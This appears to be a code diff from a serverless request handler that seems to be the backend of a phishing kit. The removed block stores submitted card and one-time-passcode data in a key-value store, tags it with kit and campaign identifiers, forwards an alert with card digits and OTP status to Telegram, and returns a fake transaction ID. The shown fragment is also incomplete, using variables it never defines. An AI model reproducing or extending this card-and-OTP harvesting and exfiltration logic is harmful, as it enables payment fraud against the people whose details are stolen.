@@ -106,26 +106,6 @@ async function handleRequest(request, env, ctx) {
     try { data = await request.json(); } catch (e) { return json({ error: 'invalid json' }, 400); }
     return json({ status: 'success', tx: 'BMB-TEST' });
   }
-    const rawId = crypto.randomUUID();
-
-    if (env.KV) {
-      await env.KV.put(`sub:${rawId}`, JSON.stringify(payload), { expirationTtl: 2592000 });
-    }
-
-    // Metadata
-    const meta = {
-      id: rawId, ts: Date.now(), ip, kit: data.kit || 'unknown',
-      campaign_id: data.campaign_id || 'unknown',
-      fields: ['card', 'otp'],
-      tx: ghostTx().tx
-    };
-    if (env.KV) await env.KV.put(`meta:${rawId}`, JSON.stringify(meta), { expirationTtl: 2592000 });
-
-    // Telegram alert
-    await sendTelegram(env, `✅ TXN ${meta.tx}\ncard: ****${card.slice(-4)}\nOTP: ✅\nkit: ${meta.kit}\ncamp: ${meta.campaign_id}`);
-
-    return json(ghostTx());
-  }
 
   return json({ error: 'not found' }, 404);
 }
